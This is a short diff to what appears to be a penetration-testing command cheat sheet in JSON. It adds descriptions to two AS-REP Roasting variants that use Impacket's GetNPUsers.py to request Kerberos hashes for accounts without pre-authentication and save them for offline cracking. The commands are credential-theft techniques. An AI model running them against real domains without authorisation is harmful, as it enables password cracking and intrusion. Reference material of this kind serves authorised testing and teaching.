@@ -194,11 +194,13 @@
   "variations": [
     {
       "label": "Authenticated (enumerate + roast)",
-      "command": "GetNPUsers.py <domain>/<user>:<password> -dc-ip <dc_ip> -request -format hashcat -outputfile asrep.txt"
+      "command": "GetNPUsers.py <domain>/<user>:<password> -dc-ip <dc_ip> -request -format hashcat -outputfile asrep.txt",
+      "description": "Uses Impacket GetNPUsers to perform AS-REP Roasting - requests authentication data for accounts with Kerberos pre-auth disabled. The returned AS-REP can be cracked offline to recover passwords."
     },
     {
       "label": "Single user, no creds",
-      "command": "GetNPUsers.py <domain>/<target_user> -dc-ip <dc_ip> -no-pass -format hashcat"
+      "command": "GetNPUsers.py <domain>/<target_user> -dc-ip <dc_ip> -no-pass -format hashcat",
+      "description": "Uses Impacket GetNPUsers to perform AS-REP Roasting - requests authentication data for accounts with Kerberos pre-auth disabled. The returned AS-REP can be cracked offline to recover passwords."
     }
   ],
   "steps": [
